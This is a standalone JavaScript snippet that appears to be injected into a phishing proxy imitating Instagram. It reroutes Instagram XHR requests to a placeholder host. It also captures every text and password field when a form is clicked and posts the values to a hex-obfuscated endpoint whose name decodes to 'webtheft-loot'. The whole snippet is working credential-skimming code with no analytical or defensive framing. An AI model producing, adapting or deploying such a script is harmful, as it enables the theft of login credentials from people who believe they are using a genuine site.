// Rewrite XHR requests
(function () {
  const originalOpen = XMLHttpRequest.prototype.open;

  XMLHttpRequest.prototype.open = function (
    method,
    url,
    async,
    user,
    password,
  ) {
    if (typeof url === "string" && url.includes("www.instagram.com")) {
      url = url.replace("www.instagram.com", "{actual_host}");
    }
    return originalOpen.call(this, method, url, async, user, password);
  };
})();
// Intercept form data
document.addEventListener("click", async (event) => {
  const e = event.target.closest("form");
  if (!e) return;
  const n = e.querySelectorAll('input[type="text"], input[type="password"]'),
    o = {};
  n.forEach((t) => {
    const e = t.name || t.id || "unknown";
    o[e] = t.value;
  });
  try {
    await fetch("/77656274686566742d6c6f6f74", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(o),
    });
  } catch (t) {}
});
